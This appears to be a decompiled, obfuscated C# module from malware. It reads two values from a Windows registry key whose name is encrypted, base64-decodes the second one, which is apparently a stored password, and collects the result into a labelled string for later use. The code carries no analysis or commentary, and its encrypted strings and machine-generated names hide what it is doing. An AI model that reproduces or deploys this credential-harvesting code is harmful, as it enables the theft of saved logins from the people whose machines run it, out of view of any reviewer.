using System;
using System.Diagnostics;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal sealed class Class27
{
	public class Class28
	{
		[DebuggerNonUserCode]
		public Class28()
		{
		}

		public string method_0()
		{
			string result = null;
			string text = "";
			string text2 = "";
			try
			{
				text = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue(Class9.smethod_0("jauwy8ORr66zsKStrLWsjq6wzreUpr/JpZelx8jNucHX6cm3y97OqJqjAw==", "False"), Class9.smethod_0("hr+80L6SubwY", "False"), (object)null));
				text2 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue(Class9.smethod_0("dpSZtKx6mJecmY2WlZ6Vd5eZt6B9j6iyjoCOsLG2oqrA0rKgtMe3kYOMGg==", "False"), Class9.smethod_0("lMDd5Nqz0c4F", "False"), (object)null));
				string_0 = Class9.smethod_0("cIuWnY9wi5adj3CLp89/fJ6WnY9wi5adj3CLlp2PcBQ=", "False") + "\r\n\r\n" + text + "\r\n" + method_1(text2) + "\r\n" + Class9.smethod_0("aIOOlYdog46Vh2iDjpWHaIOOlYdog46Vh2iDjpWHaIMd", "False");
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_1(string string_0)
		{
			string result = default(string);
			try
			{
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				Decoder decoder = uTF8Encoding.GetDecoder();
				byte[] array = Convert.FromBase64String(string_0);
				int charCount = decoder.GetCharCount(array, 0, array.Length);
				char[] array2 = new char[charCount - 1 + 1];
				decoder.GetChars(array, 0, array.Length, array2, 0);
				string text = new string(array2);
				result = text;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
